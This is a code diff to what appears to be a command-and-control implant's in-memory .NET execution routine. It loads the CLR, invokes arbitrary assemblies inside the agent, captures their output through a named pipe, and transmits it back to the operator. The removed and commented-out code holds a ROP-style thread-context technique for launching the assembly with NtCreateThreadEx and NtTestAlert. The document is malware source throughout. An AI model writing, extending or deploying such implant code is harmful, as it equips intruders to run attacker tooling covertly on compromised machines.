@@ -3,7 +3,7 @@
 #include <Core/MiniStd.h>
 #include <Core/Dotnet.h>
 
-#include <Inject/InjectUtil.h>
+#define PIPE_BUFFER 0x10000 * 5
 
 GUID xCLSID_CLRMetaHost     = {0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
 GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
@@ -24,12 +24,17 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     ULONG          idx[ 1 ]       = { 0 };
     VARIANT        Object         = { 0 };
 
-    /* Thread object variables. */
-    NT_PROC_THREAD_ATTRIBUTE_LIST ThreadAttr = { 0 };
-    CLIENT_ID                     ClientId   = { 0 };
-
     /* Create a named pipe for our output. try with anon pipes at some point. */
-    Instance.Dotnet->Pipe = Instance.Win32.CreateNamedPipeW( Instance.Dotnet->PipeName.Buffer, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 0x10000, 0x10000, 0, NULL );
+    Instance.Dotnet->Pipe = Instance.Win32.CreateNamedPipeW(
+        Instance.Dotnet->PipeName.Buffer,
+        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
+        PIPE_TYPE_MESSAGE,
+        PIPE_UNLIMITED_INSTANCES,
+        PIPE_BUFFER, PIPE_BUFFER,
+        0,
+        NULL
+    );
+
     if ( ! Instance.Dotnet->Pipe )
     {
         PRINTF( "CreateNamedPipeW Failed: Error[%d]\n", NtGetLastError() )
@@ -158,6 +163,25 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     Instance.Dotnet->StdOut = Instance.Win32.GetStdHandle( STD_OUTPUT_HANDLE );
     Instance.Win32.SetStdHandle( STD_OUTPUT_HANDLE , Instance.Dotnet->File );
 
+    if ( Instance.Dotnet->MethodInfo->lpVtbl->Invoke_3( Instance.Dotnet->MethodInfo, Object, Instance.Dotnet->MethodArgs, &Instance.Dotnet->Return ) != S_OK )
+    {
+        PUTS( "Invoke Assembly Failed" )
+        return FALSE;
+    }
+
+    Instance.Dotnet->Invoked = TRUE;
+
+    /* push output */
+    DotnetPush();
+
+
+    /*
+     * TODO: Finish/Fix this.
+     *       It seems like its way to unstable to use this
+     *       assembly crashes the agent randomly and dont know why.
+     *       Fix this once i get motivated enough or remove this entirely. */
+
+    /*
     PUTS( "Create Thread..." )
 
     MemSet( &ThreadAttr, 0, sizeof( PROC_THREAD_ATTRIBUTE_NUM ) );
@@ -186,7 +210,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 MemCopy( Instance.Dotnet->RopEvnt, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );
                 MemCopy( Instance.Dotnet->RopExit, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );
 
-                /* This rop executes the entrypoint of the assembly */
+                // This rop executes the entrypoint of the assembly
                 Instance.Dotnet->RopInvk->ContextFlags  = CONTEXT_FULL;
                 Instance.Dotnet->RopInvk->Rsp          -= U_PTR( 0x1000 * 6 );
                 Instance.Dotnet->RopInvk->Rip           = U_PTR( Instance.Dotnet->MethodInfo->lpVtbl->Invoke_3 );
@@ -196,7 +220,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 Instance.Dotnet->RopInvk->R9            = U_PTR( &Instance.Dotnet->Return );
                 *( PVOID* )( Instance.Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
 
-                /* This rop tells the main thread (our agent main thread) that the assembly executable finished executing */
+                // This rop tells the main thread (our agent main thread) that the assembly executable finished executing
                 Instance.Dotnet->RopEvnt->ContextFlags  = CONTEXT_FULL;
                 Instance.Dotnet->RopEvnt->Rsp          -= U_PTR( 0x1000 * 5 );
                 Instance.Dotnet->RopEvnt->Rip           = U_PTR( Instance.Win32.NtSetEvent );
@@ -204,7 +228,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 Instance.Dotnet->RopEvnt->Rdx           = U_PTR( NULL );
                 *( PVOID* )( Instance.Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
 
-                /* Wait til we freed everything from the dotnet */
+                // Wait til we freed everything from the dotnet
                 Instance.Dotnet->RopExit->ContextFlags  = CONTEXT_FULL;
                 Instance.Dotnet->RopExit->Rsp          -= U_PTR( 0x1000 * 4 );
                 Instance.Dotnet->RopExit->Rip           = U_PTR( Instance.Syscall.NtWaitForSingleObject );
@@ -227,7 +251,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                     PackageAddInt32( PackageInfo, ClientId.UniqueThread );
                     PackageTransmit( PackageInfo, NULL, NULL );
 
-                    /* we have successfully invoked the main function of the assembly executable. */
+                    // we have successfully invoked the main function of the assembly executable.
                     Instance.Dotnet->Invoked = TRUE;
 
                 } else PUTS( "NtAlertResumeThread failed" )
@@ -237,9 +261,10 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         } else PUTS( "NtCreateThreadEx failed" )
 
     } else PUTS( "NtCreateEvent failed" )
+    */
 
 Leave:
-    return Instance.Dotnet->Invoked;
+    return TRUE;
 }
 
 /* push anything from the pipe */
@@ -292,7 +317,7 @@ VOID DotnetPush()
         DotnetPushPipe();
 
         /* check if the assembly is still running. */
-        if ( Instance.Win32.WaitForSingleObjectEx( Instance.Dotnet->Event, 0, FALSE ) == WAIT_OBJECT_0 )
+        /* if ( Instance.Win32.WaitForSingleObjectEx( Instance.Dotnet->Event, 0, FALSE ) == WAIT_OBJECT_0 )
         {
             PUTS( "Event has been signaled" )
 
@@ -302,17 +327,13 @@ VOID DotnetPush()
 
             PUTS( "Dotnet Invoke thread isn't active anymore." )
             Close = TRUE;
-        }
+        } */
 
         /* just in case the assembly pushed something last minute... */
         DotnetPushPipe();
 
         /* Now free everything */
-        if ( Close )
-        {
-            PUTS( "Dotnet Close" )
-            DotnetClose();
-        }
+        DotnetClose();
     }
 }
 
